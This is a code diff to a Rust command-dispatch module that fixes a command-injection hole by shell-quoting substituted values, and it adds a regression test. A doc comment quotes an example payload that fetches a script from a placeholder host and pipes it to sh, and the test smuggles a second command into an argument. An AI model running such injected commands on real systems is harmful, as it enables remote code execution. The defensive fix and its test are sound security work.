@@ -105,6 +105,14 @@ fn resolve_templates(value: &serde_json::Value, payload: &serde_json::Value) -> 
     }
 }
 
+/// Single-quote a substituted value so it stays inert when the resolved
+/// command string is handed to `sh -c` in the reaper. Substitution values are
+/// untrusted (they arrive over a socket payload), so a bare splice is a
+/// command-injection vector: `{message}` → `'; curl http://evil/x.sh | sh; echo '`.
+fn shell_quote(s: String) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
 fn substitute_placeholders(template: &str, payload: &serde_json::Value) -> String {
     let mut result = template.to_string();
     if let serde_json::Value::Object(map) = payload {
@@ -120,10 +128,11 @@ fn substitute_placeholders(template: &str, payload: &serde_json::Value) -> Strin
                     let abs_end = abs_start + brace_end;
                     let key = &result[abs_start + 1..abs_end];
                     if let Some(val) = source_map.get(key) {
-                        let replacement = match val {
+                        let raw = match val {
                             serde_json::Value::String(s) => s.clone(),
                             other => other.to_string(),
                         };
+                        let replacement = shell_quote(raw);
                         result.replace_range(abs_start..=abs_end, &replacement);
                         start = abs_start + replacement.len();
                     } else {
@@ -171,7 +180,19 @@ mod tests {
         assert_eq!(result.0, "bash");
         assert_eq!(
             result.1.get("command").unwrap().as_str().unwrap(),
-            "cargo build --release"
+            "cargo build '--release'"
+        );
+    }
+
+    #[test]
+    fn test_dispatch_shell_quotes_injected_values() {
+        let commands = make_commands();
+        let payload =
+            json!({"command":"build","args":{"release_flag":"--release; touch /tmp/pwned"}});
+        let result = dispatch_commands(&commands, "build", &payload).unwrap();
+        assert_eq!(
+            result.1.get("command").unwrap().as_str().unwrap(),
+            "cargo build '--release; touch /tmp/pwned'"
         );
     }
 
